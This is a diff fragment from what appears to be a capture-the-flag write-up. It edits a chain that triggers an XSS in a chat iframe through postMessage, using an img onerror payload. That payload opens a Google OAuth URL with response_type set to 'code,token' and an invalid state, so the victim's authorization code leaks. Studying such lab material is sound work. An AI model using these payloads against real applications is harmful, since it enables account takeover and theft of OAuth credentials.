@@ -149,9 +149,9 @@ So we have all our gadgets, here is the plan :
 - Trigger the XSS on the chat domain to force the oauth to be triggered with a wrong state to trigger a non-happy path :
 
 ```
-https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?response_type=token&redirect_uri=https%3A%2F%2Fapp-give-me-a-switch.esaip-cyber.com%2Fauth%2Fcallback&scope=email&client_id=374058566213-j138s6n7s5dmpqqj36nqj1c2kk62eivo.apps.googleusercontent.com&state=aa20df0b6bc39be1ae8d24d8f56e954e3e271e76b9e85879c687653e205788f649aa&service=lso&o2v=2&flowName=GeneralOAuthFlow
+https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?response_type=code,token&redirect_uri=https%3A%2F%2Fapp-give-me-a-switch.esaip-cyber.com%2Fauth%2Fcallback&scope=email&client_id=374058566213-j138s6n7s5dmpqqj36nqj1c2kk62eivo.apps.googleusercontent.com&state=aa20df0b6bc39be1ae8d24d8f56e954e3e271e76b9e85879c687653e205788f649aa&service=lso&o2v=2&flowName=GeneralOAuthFlow
 
-- response_type : token => here we want the token of the victim to be able to pass it through the /auth/callback endpoint of the application
+- response_type : code,token => here we want the code of the victim, and we put "token" to have the response in the fragment of the URL
 - client_id : We recover it from a normal authentication with the app
 - state : An invalid state to trigger the non-happy path
 ```
@@ -177,7 +177,7 @@ document.getElementById("iframe").contentWindow.postMessage({"action":"init","ca
 
 document.getElementById("iframe").contentWindow.postMessage({"action":"ask","question":"a".repeat(999)+"<"},"*");
 
-document.getElementById("iframe").contentWindow.postMessage({"action":"ask","question":`<img src=x onerror="b = window.open('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?response_type=token&redirect_uri=https%3A%2F%2Fapp-give-me-a-switch.esaip-cyber.com%2Fauth%2Fcallback&scope=email&client_id=374058566213-j138s6n7s5dmpqqj36nqj1c2kk62eivo.apps.googleusercontent.com&state=aa20df0b6bc39be1ae8d24d8f56e954e3e271e76b9e85879c687653e205788f649aa&service=lso&o2v=2&flowName=GeneralOAuthFlow')">`},"*");
+document.getElementById("iframe").contentWindow.postMessage({"action":"ask","question":`<img src=x onerror="b = window.open('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?response_type=code,token&redirect_uri=https%3A%2F%2Fapp-give-me-a-switch.esaip-cyber.com%2Fauth%2Fcallback&scope=email&client_id=374058566213-j138s6n7s5dmpqqj36nqj1c2kk62eivo.apps.googleusercontent.com&state=aa20df0b6bc39be1ae8d24d8f56e954e3e271e76b9e85879c687653e205788f649aa&service=lso&o2v=2&flowName=GeneralOAuthFlow')">`},"*");
 
 document.getElementById("iframe").contentWindow.postMessage({"action":"ask","question":"a".repeat(999)+"<"},"*")
 
